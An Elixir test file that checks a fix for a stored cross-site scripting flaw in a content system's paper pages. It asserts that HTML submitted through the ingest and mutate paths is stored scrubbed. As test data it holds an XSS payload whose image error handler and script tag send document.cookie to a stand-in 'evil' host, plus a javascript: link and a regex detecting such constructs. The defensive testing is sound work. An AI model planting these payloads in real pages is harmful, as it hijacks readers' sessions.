defmodule Barkpark.Papers.PaperBodyHtmlXssTest do
  @moduledoc """
  Protective test for the stored-XSS finding (task-16059794a2df0a51).

  NAMED FAILURE MODE: a paper written with an HTML-only `body_html` (no blocks)
  persisted that markup VERBATIM, which the anonymous `/papers/:slug` reader
  then emitted through `raw/1` with no CSP backstop — so a `<script>` tag or an
  `onerror=` handler executed in every reader's browser.

  These tests assert the payload is NEUTRALISED AT STORE on BOTH write paths:

    1. `Content.upsert_paper/1` — the `:ingest` shared-secret API
       (`/v1/plugins/bulldocs/papers`, `/v1/paperflow/papers`) and Studio.
    2. `Content.apply_mutations/3` create — the ordinary write-token
       `/v1/data/mutate` path. This leg confirms the WIDER blast radius: any
       write-token holder could plant the payload, not just ingest-secret
       holders.

  The reader emits `raw(content["body_html"])`, so a clean stored value ⇒ a
  clean served page. Before the fix both paths stored the payload byte-for-byte
  (RED); after the fix the executable constructs are gone (GREEN).
  """
  use Barkpark.DataCase, async: true

  alias Barkpark.Content
  alias Barkpark.Tenancy

  # Executable constructs that must NOT survive into stored body_html.
  @exec ~r/<script|onerror\s*=|onload\s*=|javascript:/i

  @payload ~s|<h2>Legit heading</h2>| <>
             ~s|<img src=x onerror="fetch('//evil/'+document.cookie)">| <>
             ~s|<script>document.location='//evil/'+document.cookie</script>| <>
             ~s|<a href="javascript:alert(1)">click</a>|

  describe "upsert_paper/1 (ingest + Studio path)" do
    test "a body_html-only paper is stored with script/handler/scheme stripped" do
      slug = "xss-ingest-#{System.unique_integer([:positive])}"

      {:ok, _paper} = Content.upsert_paper(%{slug: slug, body_html: @payload})

      stored = get_in(Content.get_paper(slug).content, ["body_html"])

      refute stored =~ @exec
      # Legitimate content is preserved — the scrub is not a nuke.
      assert stored =~ "Legit heading"
    end
  end

  describe "apply_mutations/3 create (write-token /v1/data/mutate path)" do
    setup do
      {:ok, ws} = Tenancy.create_workspace(%{slug: "xss-ws", name: "xss-ws"})
      {:ok, project} = Tenancy.create_project(ws, %{slug: "xss-p", name: "xss-p"})
      %{ws: ws, project: project}
    end

    test "a paper created via mutate with content.body_html is stored scrubbed", %{
      ws: ws,
      project: project
    } do
      doc_id = "xss-mutate-#{System.unique_integer([:positive])}"

      {:ok, {_tx, [result]}} =
        Content.apply_mutations(
          [
            %{
              "create" => %{
                "_id" => doc_id,
                "_type" => "paper",
                "title" => "Mutate XSS",
                "status" => "published",
                "content" => %{"body_html" => @payload}
              }
            }
          ],
          "production",
          source: :api,
          workspace_id: ws.id,
          project_id: project.id
        )

      {:ok, doc} =
        Content.get_document(result.id, "paper", "production", workspace_id: ws.id)

      stored = get_in(doc.content, ["body_html"])

      refute stored =~ @exec
      assert stored =~ "Legit heading"
    end
  end
end
